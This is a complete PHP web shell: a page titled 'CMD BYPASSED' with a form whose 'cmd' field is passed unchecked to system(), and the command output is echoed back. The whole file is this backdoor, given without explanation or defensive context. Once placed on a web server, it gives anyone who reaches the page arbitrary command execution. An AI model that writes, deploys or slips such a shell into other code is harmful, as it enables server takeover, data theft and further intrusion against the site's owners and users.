<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>\n";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "\n</pre>";
    die;
}
?>
<html>
<title>CMD BYPASSED</title>
<body>
<form method="POST">
<input type="text" name="cmd">
<input type="submit" value="run">
</form>
</body>
</html>
